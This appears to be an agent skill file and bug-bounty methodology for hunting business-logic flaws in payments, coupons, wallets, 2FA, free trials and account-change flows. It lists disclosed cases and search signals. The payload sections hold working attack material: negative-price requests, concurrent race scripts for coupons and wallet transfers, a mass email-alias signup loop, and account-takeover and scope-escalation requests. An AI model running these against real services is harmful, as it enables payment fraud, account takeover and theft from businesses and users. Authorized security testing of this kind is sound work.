---
name: hunt-business-logic
description: Hunting skill for business-logic vulnerabilities (CWE-840 Business Logic Errors, CWE-841 Improper Enforcement of Behavioral Workflow, CWE-639 Authorization Bypass via User-Controlled Key in business contexts, CWE-362 race conditions on financial flows). Built from 44 corpus reports plus 8.8K shared-platform reports across HackerOne, Bugcrowd, Huntr, GitHub Security Advisories, plus 2024-2026 meta verified against NVD — Lilishop coupon overpurchasing (CVE-2024-50654 CVSS 7.5), WWBN AVideo wallet double-spend TOCTOU (CVE-2026-34368, GHSA-h54m-c522-h6qr), Keycloak 2FA bypass (CVE-2025-3910, GHSA-5jfq-x6xp-7rw2), AlegroCart 1.2.9 negative-quantity price manipulation (Andrey Stoykov SecLists Apr 2025), Bagisto cart price manipulation (Rudransh Singh Rajpurohit Sep 2025), Doppler free-trial reset (Aditya Sunny Dec 2024), Stripe hasEverTrialed bypass (better-auth #6863 Dec 2025), email-alias trial-abuse (Mahmoud Magdy Dec 2025), Samsung Account 2FA bypass via IMEI leak (Gregory Greekas Dec 2024), 2FA bypass via password reset (KhaledAhmed107 Jan 2026), pre-ATO via SSO migration (Giongnef Jan 2024), Tesla 2020 free vehicle software upgrade race condition, Uber 2016 infinite promo credits, Aditya Bhatt 2025 InfoSec writeup on race-condition coupon stacking. Use when hunting price/quantity manipulation, coupon/discount abuse, race-condition on payment-and-checkout, MFA/2FA bypass, password reset bypass, free-trial abuse, referral abuse, currency-conversion abuse, workflow-step skipping, role/scope escalation, pre-account takeover, OTP enumeration, or any "the app trusted client-side state" finding.
sources: hackerone_public, github_advisories, github_deep, intigriti, huntr, bugcrowd, project_zero, securitylab_github, nvd_verified, seclists_disclosure, infosec_writeups
report_count: 8863
generated_at: 2026-05-04
---

## Crown Jewel Targets

Business-logic flaws are the highest-creativity-required class in bug bounty — most don't get CVEs because they're application-specific, but they're often the highest-paying single-finding class on commercial SaaS because they map directly to financial loss. The 24-month meta has crystallized around eight asset types. All CVEs below are NVD-verified.

**1. Payment / checkout flow manipulation (mid four-figure to mid five-figure on e-commerce / fintech).** The "client trusts price/quantity" pattern. **CVE-2024-50654 Lilishop coupon overpurchasing (CVSS 7.5 HIGH)** — concurrent coupon-collection requests bypass quantity limit. **AlegroCart v1.2.9 negative-quantity price manipulation** (Andrey Stoykov disclosure SecLists Apr 2025 at https://seclists.org/fulldisclosure/2025/Apr/22) — `GET /alegrocart/index.php?...&quantity=-100` produces `-100 × $15.99 = -$1,599.00` cart subtotal; checkout flow accepts negative total. **Bagisto CMS v2.3.6 cart price manipulation** (Rudransh Singh Rajpurohit Sep 2025 at https://medium.com/@rudranshsinghrajpurohit/cve-2025-56426-cart-price-manipulation-vulnerability-in-bagisto-cms-468b72311969) — modify cart parameter to `-1`, system subtracts instead of adds, can place order with $0 total. The Bug Bounty Playbook documents this comprehensively at https://bugbounty.info/Attack-Surface/Web/Business-Logic/Price-Manipulation: change `99.99` to `-99.99` and watch the app issue you a refund on checkout.

**2. Race-condition payment / wallet / coupon (mid five-figure on programs that triage these as critical).** The TOCTOU pattern between balance check and balance update. **CVE-2026-34368 WWBN AVideo YPTWallet TOCTOU (GHSA-h54m-c522-h6qr)** — `transferBalance()` reads sender's wallet balance, checks sufficiency in PHP, writes new balance — all without database transactions or row-level locking. Concurrent transfers all read same stale balance, each passes check, only one deduction applied while recipient credited multiple times. With $10 balance and N concurrent requests, recipient receives up to $10×N. **Aditya Bhatt May 2025 InfoSec writeup** (https://medium.com/bugbountywriteup/bug-bounty-race-exploiting-race-conditions-for-infinite-discounts-a2cb2f233804) — applied discount coupon 20× simultaneously via Burp Suite Repeater Parallel Execution, server processed all → cart price reduced to near-zero. Industry precedents: Tesla Bug Bounty 2020 (free vehicle software upgrades via concurrent purchase requests), Uber 2016 (infinite promo credits via race), OpenCart checkout TOCTOU disclosed Dec 2025 by KhanMarshaI (https://gist.github.com/KhanMarshaI/a55f125a55de1c0d4f41e66236027e01) — guest-attacker concurrent checkout creates 3 orders for 1 stock item, inventory drops to -2.

**3. 2FA / MFA bypass via auxiliary flow (low five-figure on programs that pay this class).** Multi-factor auth bypassed because the "skip" path or alternate-flow doesn't enforce the second factor. **CVE-2025-3910 Keycloak 2FA bypass (GHSA-5jfq-x6xp-7rw2, CVSS 5.4)** — `org.keycloak.authorization` package allows users to circumvent required actions including 2FA setup. Affects Keycloak 26.0 through 26.0.10. **2FA Bypass via Reset Password** (KhaledAhmed107 Jan 2026 at https://systemweakness.com/2fa-bypass-via-reset-password-daba828b10f3, Bugcrowd VRT P3) — enable 2FA with Google Authenticator → log out → password reset flow shows "Skip" option for 2FA verification → bypassed. **Samsung Account 2FA bypass** (Gregory Greekas 2024 at https://www.hackingadventures.ca/posts/samsung-2fa-bypass) — 2FA request API discloses victim's IMEI to anyone with username; `deviceUniqueId` derived deterministically from IMEI; attacker computes expected `deviceUniqueId`, includes in auth request, bypasses 2FA on Samsung Account globally. Samsung patched Dec 2024. **Pre-Account Takeover via SSO migration** (Giongnef Jan 2024 at https://giongfnef.medium.com/business-logic-bypass-2fa-to-ato-e0dc7131b10e) — pre-register `victim@companyA.com` in Store DB, use Migrate function to transfer to SSO DB, wait for victim to register; attacker still has access to all resources after victim signs up.

**4. Free-trial / subscription abuse (mid four-figure on SaaS programs that pay this class — many don't).** **Doppler free-trial reset** (Aditya Sunny Dec 2024 at https://adityasunny06.medium.com/how-i-identified-a-revenue-loss-bug-in-dopplers-free-trial-system-b88919aa161f) — disclosed Nov 14 2024 to Doppler — sign up → activate 14-day trial → cancel → switch to free Developer Mode → revert to paid Team Mode → premium features regranted indefinitely. **Email-alias unlimited trial abuse** (Mahmoud Magdy Dec 2025 at https://medium.com/@mahmoudmagdy45456/violation-of-secure-design-principles-unlimited-free-trial-abuse-via-email-aliases-3de0756eb58c) — register `user+a1@gmail.com`, `user+a2@gmail.com`, etc.; all deliver to same inbox but app treats each as new user. **Stripe `hasEverTrialed` bypass** (better-auth issue #6863 Dec 2025 at https://github.com/better-auth/better-auth/issues/6863) — `findOne` returns whichever subscription DB returns first; if it's a new incomplete subscription, `hasEverTrialed` returns false — user trials again on Stripe. **HackerOne 2024 H1 high "Premium Trial Subscription Upgrade and Claim Offer"** — total price reduced via promo logic.

**5. Coupon stacking / discount abuse (low to mid four-figure on most e-commerce; mid four-figure on race-chained variants).** Apply same coupon multiple times, apply multiple distinct coupons when only one allowed, change discount-application order. **Aditya Bhatt May 2025** (above) — coupon applied 20× via parallel race; cart value = jacket price - (discount × 20). **Unlimited Reuse of Coupon Code Allows Free Shipping** (H1 2026 low) — coupon validation lacks usage tracking. **Bug Bounty Playbook**: stack aggressively until you hit the cap; check if cap logic is bypassable.

**6. OTP / phone-number manipulation flows (mid four-figure to low five-figure on programs that triage as ATO).** **Change Phone Number OTP Flaw → Any Phone Number Takeover** (H1 2024 critical disclosed) — change-phone flow doesn't verify ownership of the new number, just sends OTP to it; attacker can change victim's phone via crafted request. The pattern: phone-change API accepts new phone number from request body, sends OTP only to the new (attacker-controlled) number, attacker confirms with their own OTP, victim loses account access.

**7. Role / scope / tier escalation via business-logic bypass (mid four-figure on multi-tier SaaS).** **OpenClaw WebSocket shared-auth elevated scopes** (GHSA, 2026 critical) — WebSocket connections share auth context across users; client can self-declare elevated scopes. **Business Logic Bypass: Setting "Read Access" Role Without Pro Plan Subscription** (H1 2026 medium) — role-assignment API doesn't check subscription tier. **Authorization Bypass in Starknet Snap via enableAuthorize parameter** (H1 2026 medium) — toggle parameter bypasses authorization check. **CVE-2026-30956 OneUptime**, **CVE-2026-32131 Zitadel**, and **CVE-2025-64431 Zitadel V2Beta** are the 2025-2026 tenant/scope-control analogs: client-controlled tenant context or insufficient org scoping turns a normal user into cross-tenant admin. **CVE-2024-21632 nOAuth** and **CVE-2025-55241 Entra actor-token impersonation** are identity-logic variants: the app trusts the wrong claim, wrong tenant, or wrong actor.

**8. Workflow-step skipping (mid three-figure to low four-figure direct, mid four-figure when chained).** Multi-step flows where step N can be skipped via direct API call. **Business Logic error leads to bypass 2FA requirement** (H1 2024 high) — direct API call to step N+1 bypasses step N. **Create account without auth via response manipulation** (H1 2026 low) — modify the success response in transit, app redirects to authenticated state. **Customer can cancel individual booking in a batch causing partner lock** (H1 2025 medium) — atomicity violation.

**Industry-specific: automotive PII chains (Sam Curry pattern — high four-figure to mid five-figure on automaker programs).** Sam Curry's 2024 Kia disclosure (samcurry.net/hacking-kia) and 2023 auto-industry-wide disclosure (samcurry.net/web-hackers-vs-the-auto-industry) chain business-logic flaws (channel header tier escalation) with IDOR/auth-bypass for vehicle-PII access and remote control. The pattern repeats: dealer-portal vs customer-portal share backend; channel header determines tier; flip the header to escalate.

**Industry-specific: financial / fintech programs.** Bug bounty on Stripe, PayPal, Venmo, Cash App tend to pay top-tier for race conditions on transfers, multi-currency conversion abuse, ledger-consistency violations. Reference better-auth issue #6863 (Dec 2025) for one disclosed Stripe-related case.

**What pays the most:** wallet / payment double-spend via race condition (mid five-figure on financial programs — WWBN AVideo CVE-2026-34368 pattern). 2FA bypass enabling full ATO on programs that triage as critical (low five-figure — Samsung pattern, Keycloak CVE-2025-3910). Negative-quantity / negative-price → free order or refund (mid four-figure on e-commerce — AlegroCart, Bagisto patterns). Free-trial unlimited abuse (mid four-figure on programs that pay this class; many don't — Doppler pattern). Coupon stacking via race (mid four-figure — Aditya Bhatt 2025 pattern). OTP-flow manipulation enabling phone takeover (low to mid five-figure on programs that triage as ATO — H1 2024 disclosed pattern).

## Attack Surface Signals

Greppable signals on a target codebase or live target indicating business-logic surface:

```bash
# Price/quantity fields trusted from client (negative-value / overflow vulnerable)
rg -n -e 'request\.body\.(price|quantity|amount|total)' \
   -e 'req\.body\.(price|quantity|amount|total)' \
   -e '\$_(POST|GET)\[.(price|quantity|amount|total).\]' \
   --type js --type ts --type py --type php --type java

# Discount/coupon application without usage tracking
rg -n -e 'apply.*coupon' -e 'redeem.*code' -e 'discount\.apply' \
   --type js --type ts --type py --type ruby --type java

# TOCTOU patterns — read-then-write without transaction/lock
rg -n -B 2 -A 10 -e 'getBalance\(\)|wallet\.balance' \
   --type js --type ts --type py --type php | rg -B 5 -A 5 'updateBalance|setBalance|wallet\.update'

# 2FA bypass via skip option (KhaledAhmed107 Jan 2026 pattern)
rg -n -e 'skip.*2fa' -e 'skip.*mfa' -e 'bypass.*otp' \
   --type js --type ts --type py

# Subscription state transitions without payment validation
rg -n -e 'plan\.upgrade' -e 'tier\.set' -e 'subscription\.status\s*=' \
   --type js --type ts --type py --type java

# Email canonicalization missing (Mahmoud Magdy Dec 2025 alias-abuse pattern)
rg -n -e 'email.*toLowerCase' -e 'email.*strip' -e 'normalizeEmail' \
   --type js --type ts --type py | head

# Race-prone endpoints (state mutations without locking)
rg -n -B 2 -A 8 -e 'def transfer' -e 'function transfer' \
   --type py --type js --type ts | rg -v 'BEGIN|FOR UPDATE|lock|mutex|atomic'

# OTP / phone change flow without ownership verification
rg -n -e 'change.*phone' -e 'update.*phone' -e 'verify.*phone' \
   --type js --type ts --type py | head

# Promo / referral abuse surface
rg -n -e 'referral\.create' -e 'promo\.apply' -e 'invite\.send' \
   --type js --type ts --type py

# Idempotency / replay controls missing on state-changing money flows
rg -n -e 'Idempotency-Key' -e 'idempotency' -e 'dedupe' \
   --type js --type ts --type py --type java

# Client-controlled tenant / tier / channel dispatch
rg -n -e 'req\.headers\[(.x-tenant|.tenant|.channel|.tier)' \
   -e 'headers\.(tenant|channel|tier|project)' \
   --type js --type ts --type py --type java

# Final-state gates that trust a previous step flag
rg -n -e 'email_verified' -e 'mfa_verified' -e 'payment_verified' \
   -e 'workflow_step' -e 'completed_steps' \
   --type js --type ts --type py --type java
```

HTTP-level signals on a live target:

- Cart / checkout endpoints accepting `quantity`, `price`, `total` in request body — **price-manipulation surface** (AlegroCart, Bagisto patterns)
- Coupon/promo apply endpoint returning success on each call without usage-counter increment — **coupon stacking surface** (Aditya Bhatt May 2025 pattern, Lilishop CVE-2024-50654)
- Wallet transfer endpoint without distributed lock indicators (no `Idempotency-Key` header support, no 409 on concurrent-test) — **TOCTOU surface** (WWBN AVideo CVE-2026-34368)
- 2FA flow with "Skip" button or alternate path that doesn't enforce 2FA — **2FA bypass surface** (Keycloak CVE-2025-3910, KhaledAhmed107 Jan 2026 pattern)
- Phone-change endpoint that sends OTP only to NEW number (not also requiring confirmation from OLD number) — **phone-takeover surface** (H1 2024 critical pattern)
- Free-trial / cancel / re-subscribe flow that doesn't track historical-trial state — **trial-abuse surface** (Doppler pattern, Stripe `hasEverTrialed` better-auth #6863)
- Email registration accepting `user+alias@gmail.com` as distinct from `user@gmail.com` — **trial-abuse via alias** (Mahmoud Magdy Dec 2025)
- SSO / migration flow allowing pre-registration of foreign-domain emails — **pre-ATO surface** (Giongnef Jan 2024 pattern)
- Subscription-tier endpoint accepting tier name from request body without payment validation — **tier-escalation surface** (H1 2026 medium pattern, Starknet Snap pattern)
- WebSocket connection with shared auth context across multiple clients — **scope-escalation surface** (OpenClaw 2026 critical pattern)
- Multi-step workflow API where step N+1 doesn't validate step N completion — **workflow-skip surface** (KhaledAhmed107 Jan 2026 pattern at scale)
- Channel-header-based tier dispatch (`channel: customer` vs `channel: dealer`) — **automotive-style escalation surface** (Sam Curry 2024 Kia)
- Order-cancellation endpoint that operates on individual items in a batch order — **atomicity-violation surface** (H1 2025 medium pattern)
- Server returns final price/total without server-side recalculation visible in response — **client-trust surface** (Bug Bounty Playbook canonical pattern)

## Insertion Point Taxonomy

Every place business-logic state can be manipulated:

- **URL path** — `/orders/{id}/cancel` (atomicity violation), `/users/{id}/upgrade` (tier escalation)
- **URL query** — `?quantity=-1` (AlegroCart), `?coupon=...&coupon=...` (multi-coupon)
- **Body fields (JSON / form)** — `price`, `quantity`, `total`, `tax`, `discount`, `currency`, `tier`, `role`, `subscription_status`, `trial_started_at`, `is_paid` (mass-assignment cross-reference: see hunt-idor)
- **Headers** — `Idempotency-Key` (or its absence — race-condition surface), `Channel:` (tier dispatch — Sam Curry Kia), `X-Tenant-Id:` (cross-tenant — see hunt-idor), `X-Subscription-Tier:` (custom tier override)
- **JWT claims** — `tier`, `roles[]`, `subscription`, `trial_status`. Modify if signature isn't verified (cross-reference hunt-idor JWT swap).
- **Cookies** — `tier_cookie`, `subscription_state`, `referral_code` set by client; modify if not signed.
- **Race windows** — apply same coupon 20× via Burp Repeater parallel execution; transfer wallet balance 5× concurrently; trigger checkout on inventory of 1 with 3 parallel requests.
- **Email aliases** — `user+a1@gmail.com`, `user+a2@gmail.com`, `user.dot.variant@gmail.com`, `user@googlemail.com` vs `@gmail.com` — same inbox, different "users" to the app.
- **State transitions** — go directly to step N+1 via API call without completing step N (workflow skip).
- **Time / timezone** — set `created_at` in past via request body to backdate trial start; use timezone difference to extend trial.
- **Currency switching mid-flow** — convert USD price to JPY then JPY back to USD; rounding differences accumulate.
- **Negative numbers** — `quantity=-1`, `amount=-100`, `discount=-50` (negative discount = surcharge in attacker's favor on broken logic).
- **Zero values** — `price=0`, `quantity=0` — what does "free" mean to the app's business rules?
- **Integer overflow** — `quantity=2147483648` overflows int32 to negative.
- **Floating-point precision** — `0.1 + 0.2 = 0.30000000000000004`; submit values that exploit IEEE-754 rounding.
- **Workflow concurrency** — start two concurrent flows on the same resource (cancel + refund, withdraw + transfer).
- **Phone / email change flows** — submit new contact, verify only the NEW contact (not also the old) — phone takeover.
- **OAuth / SSO migration paths** — pre-register foreign-domain emails, wait for victim to sign up, dual-account scenario.
- **Permission cascade** — "share" feature doesn't recompute permissions on referenced resource; original permissions persist post-share.
- **Refund / chargeback flows** — refund amount accepted from client request, exceeds original payment.
- **Inventory / stock** — checkout doesn't atomically decrement stock; concurrent checkouts oversell, stock goes negative.

For each surface, send: negative values, zero, max-int, unicode-confusable email aliases, concurrent identical requests via Burp Repeater parallel execution, modified state transitions skipping intermediate steps, modified JWT claims if signature is weak.

## Step-by-Step Hunting Methodology

1. **Map the entire money-flow.** For any commercial app, trace every endpoint touched during: signup → trial → upgrade → checkout → payment → refund → cancel → re-subscribe. Note each request's `price`, `quantity`, `discount`, `tier`, `tax`, `total`, `currency`, `coupon` field locations. The bigger the flow, the more business-logic surface.

2. **Test negative / zero / overflow on every numeric field.** AlegroCart pattern: `quantity=-100` → negative cart total → app accepts. Bagisto pattern: cart parameter `-1` → subtracts instead of adds. Test `0`, `-1`, `0.0001`, `2147483648` (int32 overflow), `999999999999999`. Bug Bounty Playbook canonical: change `99.99` to `-99.99` and watch app issue refund.

3. **Test client-supplied price / total.** Modify response body or request body to send `total: 0` or `total: 0.01`. If the server processes the order without recalculating the total server-side from cart items + tax + shipping + discount, that's the bug. Hunt with Burp's Match-and-Replace to auto-modify these fields.

4. **Test coupon / discount stacking.** Apply same coupon code multiple times. Apply multiple distinct codes when only one allowed by UI. Apply discounts in different orders (percentage before fixed vs fixed before percentage — different total). Stack via race condition (Aditya Bhatt May 2025 pattern: Burp Repeater Parallel Execution sends 20 simultaneous coupon-apply requests).

5. **Race-test every state-mutating endpoint.** For wallet transfer, coupon apply, vote, claim-reward, withdraw — open Burp Repeater, duplicate the request 20 times, group into a single tab group, send as "Parallel" execution mode. WWBN AVideo CVE-2026-34368 pattern: concurrent transfers all read same balance, all pass check, recipient credited N times. Confirm via subsequent GET to inspect actual final state.

6. **Test 2FA / MFA bypass via auxiliary flows.** Enable 2FA on test account. Now test: password reset (does it require 2FA? KhaledAhmed107 Jan 2026 case: "Skip" button visible). OAuth login (does it preserve 2FA requirement?). API auth (do API tokens bypass 2FA?). Mobile app login (does it use a different auth flow without 2FA?). Recovery flow (account recovery via security questions / backup email — does it bypass?).

7. **Test free-trial reset / abuse.** Sign up → activate trial → cancel → look for any path that re-enables trial or premium features without payment. Doppler pattern: cancel trial → switch to free tier → revert to paid tier = trial back. Email aliases: `user+a1@gmail.com`, `user+a2@gmail.com` — register N times. Stripe `hasEverTrialed` better-auth #6863: when user has multiple subscription records, check uses wrong query.

8. **Test phone / email change ownership-verification.** Submit new phone number to change-phone API. Does it require OTP from BOTH old and new number, or only new? H1 2024 critical: only new → phone takeover. Same for email change: requires verification of OLD email or just the NEW?

9. **Test workflow-step skipping.** Multi-step flow (signup → KYC → activate). Try direct API call to step 3 without completing step 2. Workflow may not check step N completion before allowing step N+1.

10. **Test pre-account takeover via SSO / migration.** If app has both SSO and direct-login, and supports email-domain SSO (Google Workspace, Okta), try pre-registering `user@victim-company.com` directly before victim signs up via SSO. Giongnef Jan 2024 pattern: post-SSO-signup, attacker still has access via pre-registered direct account.

11. **Test currency conversion abuse.** Add product priced in USD. Switch currency to JPY mid-flow. Switch back to USD. Did the price round to attacker's benefit? Same with refund — request refund in different currency than purchase.

12. **Test referral / invite abuse.** Self-refer (invite own second account). Refer the same email twice. Refer fake email (does the app give credit before the referred user signs up?). Refer at scale (rate limit?).

13. **Validate before reporting.** Demonstrate concrete financial impact: count records, calculate dollar-value loss, show the unauthorized state change confirmed via subsequent GET. Don't dump customer data; show 3-record proof. See Gate 0.

## Payload & Detection Patterns

### Sub-technique A — Negative quantity / negative price / negative discount (AlegroCart pattern)

```http
# AlegroCart 1.2.9 disclosure (Andrey Stoykov, SecLists Apr 2025)
# Reference: https://seclists.org/fulldisclosure/2025/Apr/22
GET /alegrocart/index.php?controller=addtocart&action=add&item=10&quantity=-100 HTTP/1.1
Host: target

# Response: cart subtotal = -$1,599.00 (system computed -100 × $15.99)
# Reference: AlegroCart 1.2.9 disclosed at https://seclists.org/fulldisclosure/2025/Apr/22
# Then proceed to checkout — system accepts negative total
```

```json
// Bagisto v2.3.6 cart price manipulation (Rudransh Singh Rajpurohit Sep 2025)
// Reference: https://medium.com/@rudranshsinghrajpurohit/cve-2025-56426-cart-price-manipulation-vulnerability-in-bagisto-cms-468b72311969
PATCH /api/cart/items/<item-id>
{
  "quantity": -1
}
// System subtracts $500 from cart total instead of adding
// Place order — accepted with $0 or negative total
// Disclosed by @rudranshsinghrajpurohit at https://medium.com/@rudranshsinghrajpurohit/cve-2025-56426-cart-price-manipulation-vulnerability-in-bagisto-cms-468b72311969
```

```json
// Generic negative-fields test set
{"quantity": -1}
{"quantity": -100}
{"price": -99.99}
{"amount": -1000}
{"discount": -50}        // negative discount = surcharge in attacker's favor
{"tax": -10}              // negative tax
{"shipping": -5}          // negative shipping
{"total": 0}              // explicit zero total
{"total": 0.01}           // minimum charge
{"refund_amount": 999999} // refund larger than original payment
```

### Sub-technique B — Coupon / discount stacking

```http
# Apply same coupon repeatedly
POST /api/cart/coupon HTTP/1.1
{"code": "SAVE20"}

POST /api/cart/coupon HTTP/1.1
{"code": "SAVE20"}     # same code again — does it stack?

POST /api/cart/coupon HTTP/1.1
{"code": "SAVE20"}     # third time

# Apply multiple distinct coupons when UI shows only one allowed
POST /api/cart/coupon
{"code": "SAVE20"}
POST /api/cart/coupon
{"code": "FREESHIP"}
POST /api/cart/coupon
{"code": "BLACKFRIDAY"}

# Reorder discount application (changes calculated total when % vs fixed)
POST /api/cart/coupon  {"code": "FIXED10"}     # apply $10 off first
POST /api/cart/coupon  {"code": "PERCENT20"}   # then 20% off — applies to discounted-price
# vs
POST /api/cart/coupon  {"code": "PERCENT20"}   # 20% off first
POST /api/cart/coupon  {"code": "FIXED10"}     # then $10 off — applies to original-price
```

### Sub-technique C — Race condition on coupon / wallet / inventory (TOCTOU)

```
# Aditya Bhatt May 2025 InfoSec writeup pattern
# Burp Suite Repeater → duplicate request 20× → group into tab group → "Send group in parallel"

POST /cart/coupon HTTP/1.1
Host: target
Cookie: session=<your-session>
Content-Type: application/json

{"code": "JACKET50OFF"}

# 20 parallel requests → server processes all → 20 discount applications
# Cart value = jacket_price - (discount × 20)
```

```python
# Python aiohttp version for higher concurrency
import asyncio, aiohttp
async def apply_coupon(session):
    async with session.post(
        'https://target/cart/coupon',
        json={'code': 'JACKET50OFF'},
        cookies={'session': '<your-session>'},
    ) as resp:
        return resp.status

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [apply_coupon(session) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        print(f"Successes: {sum(1 for r in results if r == 200)}")

asyncio.run(main())
```

```python
# WWBN AVideo CVE-2026-34368 wallet TOCTOU pattern
# transferBalance() reads → checks → writes without locking
# Multiple PHPSESSID-bearing concurrent transfer requests all read same stale balance
import requests, threading

def transfer():
    requests.post('https://target/plugin/YPTWallet/transfer', cookies={
        'PHPSESSID': '<your-session>',
    }, json={'recipient': '<victim-id>', 'amount': 10})

threads = [threading.Thread(target=transfer) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
# All 20 read sender_balance=10, all pass check, only 1 deduction effective,
# recipient credited 20× = $200 from $10 balance
# Reference: GHSA-h54m-c522-h6qr / CVE-2026-34368 (WWBN AVideo wallet TOCTOU disclosed 2026)
```

```http
# OpenCart checkout race (KhanMarshaI Dec 2025 gist)
# Concurrent guest-checkout on inventory of 1 → creates 3 orders, stock = -2
POST /checkout/checkout HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

product_id=42&quantity=1&payment_method=cod
# 3 parallel requests via Burp Repeater Parallel Execution
```

### Sub-technique D — 2FA / MFA bypass via auxiliary flow

```
# KhaledAhmed107 Jan 2026 — 2FA bypass via password reset
1. Create account, log in, enable 2FA via Google Authenticator
2. Log out
3. Navigate to Reset Password page
4. Open password reset link from email
5. When prompted for 2FA code, observe "Skip" option
6. Click Skip → set new password → redirected to dashboard, no 2FA required
# Pattern repeats across SaaS programs — always test password reset for 2FA enforcement

# Keycloak CVE-2025-3910 (GHSA-5jfq-x6xp-7rw2)
# org.keycloak.authorization circumvents required actions including 2FA setup
# Affects 26.0 through 26.0.10
# Fix: upgrade to 26.2.2+

# Samsung Account 2FA bypass (Gregory Greekas 2024)
# 2FA request API returned victim's IMEI to anyone with username
# Compute deviceUniqueId from IMEI (deterministic transformation)
# Submit auth request with computed deviceUniqueId → 2FA bypassed
# Patched Dec 2024
```

```bash
# Generic 2FA bypass test set for any account
# Test each path:
curl -X POST https://target/api/login -d '{"email":"...","password":"..."}'  # without 2FA token
curl -X POST https://target/oauth/authorize -d '...'                          # OAuth flow
curl -X POST https://target/api/auth/refresh -d '...'                          # token refresh
curl -X POST https://target/api/password-reset -d '...'                        # password reset
curl -X POST https://target/api/auth/sso -d '...'                              # SSO bypass
curl -X POST https://target/api/auth/recovery -d '...'                         # recovery flow
curl -X POST https://target/mobile/auth -d '...'                               # mobile app auth
# Any path that lands you authenticated without 2FA → bypass
```

### Sub-technique E — Free-trial / subscription abuse

```
# Doppler pattern (Aditya Sunny Dec 2024)
1. Sign up for new account
2. Activate 14-day free trial (premium features)
3. Cancel trial early → switch to free Developer Mode
4. Use developer tools to switch back to paid Team Mode
5. Premium features regranted indefinitely without payment

# Email-alias unlimited trial (Mahmoud Magdy Dec 2025)
# Gmail aliases: user+anything@gmail.com all deliver to user@gmail.com
# Most apps treat as distinct registrations
for i in $(seq 1 100); do
  curl -X POST https://target/api/signup -d "{
    \"email\":\"user+trial$i@gmail.com\",
    \"password\":\"Test123!\"
  }"
done
# 100 trials, 1 mailbox

# Gmail dot variants (also same inbox)
user@gmail.com
u.ser@gmail.com
us.er@gmail.com
u.s.er@gmail.com
# All deliver to user@gmail.com but app sees as distinct

# @googlemail.com vs @gmail.com — same Google inbox
user@gmail.com
user@googlemail.com

# Stripe hasEverTrialed bypass (better-auth #6863 Dec 2025)
# Trigger condition: user has multiple subscription records (one canceled with trial history,
# one new incomplete). findOne returns whichever DB returns first; if it's the new
# incomplete one, hasEverTrialed returns false → trial granted again
```

### Sub-technique F — Phone / email change ownership bypass

```
# H1 2024 critical: Change phone number OTP flaw → any phone takeover
# Vulnerable flow: change-phone API sends OTP only to NEW number
POST /api/account/change-phone HTTP/1.1
Authorization: Bearer <victim-session-or-stolen-token>
{"new_phone": "+15555550100"}    # attacker-controlled number

# Server sends OTP to +15555550100 (attacker)
# Attacker submits OTP → victim's account now has attacker phone
# Reset password via SMS OTP → ATO

# Secure version requires OTP from BOTH old (+1victim) and new (+1attacker) numbers

# Email change variant
POST /api/account/change-email HTTP/1.1
{"new_email": "attacker@evil.com"}
# Server sends verification email only to attacker@evil.com
# Attacker confirms → victim's email is now attacker's → password reset → ATO
```

### Sub-technique G — Workflow-step skipping

```
# Multi-step KYC flow: signup → email-verify → phone-verify → KYC → activated
# Try direct API call to "activated" state
POST /api/users/activate     # without completing email-verify, phone-verify, KYC
{"user_id": "<your-id>"}

# OR: response manipulation — intercept the "step 3 success" response, modify
# to indicate step 4 success, app redirects to authenticated state

# H1 2026 low: Create account without auth via response manipulation
# Submit signup with invalid OTP → modify response body in transit to {"success":true}
# App redirects to authenticated dashboard

# H1 2024 high: Business Logic error → bypass 2FA requirement
# Step 1: login with username/password → server responds {"requires_2fa": true, "challenge_id": "..."}
# Step 2: skip 2FA submission, go directly to /api/me — server returns user data because session cookie is set after step 1
```

### Sub-technique H — Pre-Account Takeover via SSO / migration

```
# Giongnef Jan 2024 pattern (https://giongfnef.medium.com/business-logic-bypass-2fa-to-ato-e0dc7131b10e)
# Target supports both direct-login and SSO; sso_type:null defaults to direct-login

# Step 1: Attacker pre-registers victim's corporate email in Store DB
POST /api/signup
{
  "email": "victim@companyA.com",  # victim hasn't signed up yet
  "password": "Attacker123!",
  "sso_type": null                   # direct-login mode
}

# Step 2: Attacker logs in, uses "Migrate" function to transfer to SSO DB
POST /api/sso/migrate
Authorization: Bearer <attacker-session>

# Step 3: Wait for victim to register at sso.companyA.com (legitimate flow)
# Victim enters Google SSO with victim@companyA.com — succeeds because account already exists in SSO

# Step 4: Attacker still has direct-login access to victim's account because
# the password set in Step 1 is still valid for the migrated SSO account

# Result: persistent ATO that survives victim's "secure" SSO signup

# Generic test: any time a SaaS supports both direct-login AND SSO/OAuth,
# pre-register every interesting email-domain you can find before the legitimate
# user signs up.
```

### Sub-technique I — Currency / timezone / floating-point manipulation

```
# Currency switch mid-flow
1. Add product priced $100.00 (USD) to cart
2. Switch site currency to JPY → cart shows ¥10,000 (100 USD × 100 JPY/USD rate)
3. Switch back to USD → if app converts ¥10,000 ÷ rate but uses STALE rate or different rate,
   USD price differs from original → exploit difference
4. Some apps round in attacker's favor; others round in app's favor — test both directions

# Timezone-based trial extension
# Trial starts at 2024-01-01 00:00 (server local time, UTC)
# User in UTC+14 → claims trial start of 2024-01-01 00:00 UTC+14 = 2023-12-31 10:00 UTC
# If server compares trial duration in user's timezone, can extend trial by ~24h × number-of-resets

# Floating-point precision exploitation
# IEEE-754 64-bit floats can't represent 0.1 exactly
# 0.1 + 0.2 = 0.30000000000000004 (NOT 0.3)
# Submit price: 0.1 ten times → expected $1.00 → actual $0.9999999999999999
# Multi-step accumulator may round to $0.99 in attacker's favor

# Integer overflow on quantity (int32 = 2^31 - 1 = 2147483647)
{"quantity": 2147483648}      # overflows to -2147483648 in 32-bit int
# Then quantity × price = negative total → free order
```

### Sub-technique J — Role / scope / tier escalation via business-logic

```
# OpenClaw 2026 critical: WebSocket shared-auth elevated scopes
ws = new WebSocket('wss://target/ws')
ws.onopen = () => {
  ws.send(JSON.stringify({
    type: 'auth',
    token: '<low-priv-token>',
    scopes: ['admin', 'billing', 'read', 'write']  # self-declared elevated scopes
  }))
}
# Server accepts client-declared scopes without re-validation

# H1 2026 medium: Set "Read Access" Role Without Pro Plan Subscription
POST /api/roles/assign
Authorization: Bearer <free-tier-token>
{
  "role": "ReadAccess",         # premium-only role
  "user_id": "<your-id>"
}
# Server doesn't check subscription tier before assigning role

# Starknet Snap enableAuthorize bypass (H1 2026 medium)
POST /api/wallet/sign
{
  "transaction": "...",
  "enableAuthorize": false      # toggle off authorization check
}
